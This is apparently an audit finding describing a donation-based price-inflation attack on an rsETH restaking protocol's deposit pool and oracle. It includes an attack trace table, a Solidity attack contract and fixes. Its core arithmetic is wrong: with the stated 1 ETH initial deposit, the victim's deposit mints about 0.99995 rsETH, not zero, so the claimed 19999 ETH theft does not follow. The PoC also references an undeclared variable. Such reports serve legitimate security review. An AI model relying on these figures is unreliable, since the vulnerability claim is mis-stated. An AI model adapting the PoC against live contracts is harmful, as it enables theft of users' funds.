### Title
rsETH Price Inflation via Direct ETH Donation to `LRTDepositPool` Causes Victim Deposits to Round to Zero — (File: contracts/LRTDepositPool.sol / contracts/LRTOracle.sol)

---

### Summary

An unprivileged early depositor can send ETH directly to `LRTDepositPool` (via its open `receive()` fallback), then call the public `updateRSETHPrice()` to commit the inflated TVL into the stored `rsETHPrice`. Because `getRsETHAmountToMint` divides by the stored price, a sufficiently inflated price causes a victim's deposit to round to zero rsETH. The attacker then withdraws their rsETH at the inflated price, recovering both their donation and the victim's ETH.

---

### Finding Description

**Step 1 — Price accounting uses raw `address(this).balance`.**

`LRTDepositPool.getETHDistributionData()` sets:

```solidity
ethLyingInDepositPool = address(this).balance;
``` [1](#0-0) 

`LRTDepositPool` has an unrestricted `receive()` fallback:

```solidity
receive() external payable { }
``` [2](#0-1) 

Any ETH sent directly to the contract is silently included in `totalETHInProtocol`.

**Step 2 — `updateRSETHPrice()` is public and commits the inflated balance.**

`LRTOracle._updateRsETHPrice()` computes:

```solidity
uint256 newRsETHPrice = (totalETHInProtocol - protocolFeeInETH).divWad(rsethSupply);
``` [3](#0-2) 

`updateRSETHPrice()` is callable by anyone when the oracle is not paused:

```solidity
function updateRSETHPrice() public whenNotPaused {
    _updateRsETHPrice();
}
``` [4](#0-3) 

**Step 3 — Minting divides by the stored price.**

```solidity
rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
``` [5](#0-4) 

If `rsETHPrice` is inflated to `(a0 + a1) / a0 × 1e18`, a victim depositing `u` ETH receives `u × a0 / (a0 + a1)` rsETH. When `a1 ≫ a0`, this rounds to zero.

**Step 4 — `pricePercentageLimit` defaults to zero.**

The `initialize()` function does not set `pricePercentageLimit`, so it starts at `0`. The guard:

```solidity
bool isPriceIncreaseOffLimit =
    pricePercentageLimit > 0 && priceDifference > pricePercentageLimit.mulWad(highestRsethPrice);
``` [6](#0-5) 

…is entirely bypassed when `pricePercentageLimit == 0`, allowing an unbounded single-step price jump.

---

### Impact Explanation

**Critical — Direct theft of user funds.**

Attack trace (concrete numbers):

| Step | Action | `rsethSupply` | `totalETHInProtocol` | `rsETHPrice` |
|---|---|---|---|---|
| 1 | Attacker deposits `a0 = 1 ETH` | 1e18 | 1e18 | 1e18 |
| 2 | Attacker sends `a1 = 19999e18` ETH via `receive()` | 1e18 | 20000e18 | 1e18 (stale) |
| 3 | Attacker calls `updateRSETHPrice()` | 1e18 | 20000e18 | 20000e18 |
| 4 | Victim deposits `u = 19999e18` ETH | 1e18 | 39999e18 | 20000e18 |
| — | Victim receives `19999e18 × 1e18 / 20000e18 = 0` rsETH | 1e18 | 39999e18 | — |
| 5 | Attacker calls `updateRSETHPrice()` | 1e18 | 39999e18 | 39999e18 |
| 6 | Attacker initiates withdrawal of `1e18` rsETH | — | — | — |
| — | `expectedAssetAmount = 1e18 × 39999e18 / 1e18 = 39999e18` ETH | — | — | — |
| 7 | Operator unlocks queue (normal operation) | — | — | — |
| 8 | Attacker completes withdrawal, receives `39999e18` ETH | — | — | — |

Attacker spent `1 + 19999 = 20000 ETH`, received `39999 ETH`. **Net profit: `19999 ETH` (victim's entire deposit).**

The victim deposited `19999 ETH` and received `0` rsETH — their funds are permanently unrecoverable without rsETH to burn.

---

### Likelihood Explanation

**High likelihood at protocol launch / low TVL.**

- `pricePercentageLimit` is `0` by default (not set in `initialize()`), so no per-call cap exists.
- `updateRSETHPrice()` is public and callable by any EOA.
- `LRTDepositPool.receive()` accepts ETH from any sender with no access control.
- The `minRSETHAmountExpected` slippage guard exists in `depositETH`/`depositAsset`, but users who set it to `0` (or integrators that omit it) are fully exposed.
- The attack is most profitable when TVL is low (protocol launch), exactly when `pricePercentageLimit` is most likely to be unset.

---

### Recommendation

1. **Do not use raw `address(this).balance` in TVL accounting.** Track ETH received through legitimate deposit paths in a dedicated storage variable (e.g., `ethDeposited`) and use that instead of `address(this).balance` in `getETHDistributionData()`. This prevents direct ETH donations from inflating the price.

2. **Set `pricePercentageLimit` in `initialize()`.** A non-zero default (e.g., 1% = `1e16`) ensures that even if a donation slips through, a single `updateRSETHPrice()` call cannot cause a catastrophic price jump.

3. **Require `rsethAmountToMint > 0` before minting.** Add a guard in `_beforeDeposit()`:
   ```solidity
   if (rsethAmountToMint == 0) revert ZeroRsETHMinted();
   ```

4. **Consider restricting `updateRSETHPrice()` to trusted callers** (e.g., `onlyLRTManager`) or at minimum add a cooldown to prevent rapid sequential calls.

```solidity

pragma solidity 0.8.27;

// Assume: protocol deployed, rsETHPrice initialized to 1e18 via updateRSETHPrice() with supply=0.

contract AttackPoC {
    ILRTDepositPool depositPool;
    ILRTOracle oracle;
    ILRTWithdrawalManager withdrawalManager;
    address ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    function attack() external payable {
        // Step 1: Attacker deposits 1 ETH, receives 1e18 rsETH (price = 1e18)
        depositPool.depositETH{value: 1 ether}(0, "");

        // Step 2: Attacker donates 19999 ETH directly to LRTDepositPool
        (bool ok,) = address(depositPool).call{value: 19999 ether}("");
        require(ok);

        // Step 3: Commit inflated price (rsETHPrice = 20000e18)
        oracle.updateRSETHPrice();

        // Step 4: Victim deposits 19999 ETH (in a separate tx), receives 0 rsETH
        // victim.depositETH{value: 19999 ether}(0, "");  // victim gets 0 rsETH

        // Step 5: Commit victim's ETH into price (rsETHPrice = 39999e18)
        oracle.updateRSETHPrice();

        // Step 6: Attacker initiates withdrawal of 1e18 rsETH
        // expectedAssetAmount = 1e18 * 39999e18 / 1e18 = 39999 ETH
        IRSETH(rsETH).approve(address(withdrawalManager), 1e18);
        withdrawalManager.initiateWithdrawal(ETH, 1e18, "");

        // Step 7: Operator unlocks queue (normal operation, no anomaly visible on-chain)
        // Step 8: Attacker completes withdrawal, receives 39999 ETH
        // withdrawalManager.completeWithdrawal(ETH, "");
        // Net profit: 19999 ETH stolen from victim
    }
}
